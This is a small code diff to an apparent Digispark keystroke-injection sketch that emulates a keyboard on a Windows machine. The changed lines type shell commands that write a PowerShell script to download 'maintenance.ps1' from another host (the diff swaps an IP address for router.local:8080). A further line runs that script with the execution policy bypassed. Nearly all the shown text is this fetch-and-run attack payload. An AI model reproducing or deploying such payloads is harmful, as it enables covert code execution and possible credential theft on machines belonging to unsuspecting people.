@@ -14,8 +14,8 @@ void setup()
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  //DigiKeyboard.println("cd C:/temp & mkdir wifi & cd wifi & echo (wget http://192.168.180.201:8880/ -outfile maintenance.ps1) > b.ps1");
-  DigiKeyboard.println("cd C:/temp & mkdir wifi & cd wifi & echo ((New-Object System.Net.WebClient).DownloadFile(@http://192.168.180.201:8880/maintenance.ps1@, @c:/temp/wifi/maintenance.ps1@)) > b.ps1");
+  //DigiKeyboard.println("cd C:/temp & mkdir wifi & cd wifi & echo (wget http://router.local:8080/ -outfile maintenance.ps1) > b.ps1");
+  DigiKeyboard.println("cd C:/temp & mkdir wifi & cd wifi & echo ((New-Object System.Net.WebClient).DownloadFile(@http://router.local:8080/maintenance.ps1@, @c:/temp/wifi/maintenance.ps1@)) > b.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
